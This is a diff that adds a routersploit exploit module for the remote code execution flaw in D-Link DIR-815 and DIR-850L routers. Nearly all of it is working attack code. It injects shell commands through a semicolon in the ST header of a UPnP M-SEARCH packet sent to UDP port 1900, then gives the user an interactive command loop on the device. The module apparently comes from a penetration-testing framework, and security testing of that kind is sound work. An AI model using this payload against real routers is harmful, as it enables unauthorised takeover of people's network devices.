@@ -1,0 +1,56 @@
+import socket
+
+from routersploit import (
+    exploits,
+    print_status,
+    mute,
+    shell,
+)
+
+
+class Exploit(exploits.Exploit):
+    """
+    Exploit implementation for D-Link DIR-815 and DIR-850L Remote Code Execution vulnerability.
+    If the target is vulnerable, command loop is invoked that allows executing commands on the device.
+    """
+    __info__ = {
+        'name': 'D-Link DIR-815 & DIR-850L RCE',
+        'description': 'Module exploits D-Link DIR-815 and DIR-850L Remote Code Execution vulnerability which allows executing command on the device.',
+        'authors': [
+            'Samuel Huntley',  # vulnerability discovery
+            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
+        ],
+        'references': [
+            'https://www.exploit-db.com/exploits/38715/',
+        ],
+        'devices': [
+            'D-Link DIR-815',
+            'D-Link DIR-850L',
+        ]
+    }
+
+    target = exploits.Option('', 'Target IP address e.g. 192.168.1.1')
+
+    def run(self):
+        print_status("It's not possible to check if the target is vulnerable. Try to use following command loop.")
+        print_status("Invoking command loop...")
+        print_status("It is blind command injection, response is not available")
+        shell(self, architecture="mipsel")
+
+    def execute(self, cmd):
+        buf = ('M-SEARCH * HTTP/1.1\r\n'
+               'HOST:' + self.target + ':1900\r\n'
+               'ST:urn:schemas-upnp-org:service:WANIPConnection:1;' + cmd + ';ls\r\n'
+               'MX:2\r\n'
+               'MAN:"ssdp:discover"\r\n\r\n')
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect((self.target, 1900))
+        s.send(buf)
+        s.close()
+
+        return ""
+
+    @mute
+    def check(self):
+        return None  # it is not possible to check if target is vulnerable without exploiting it
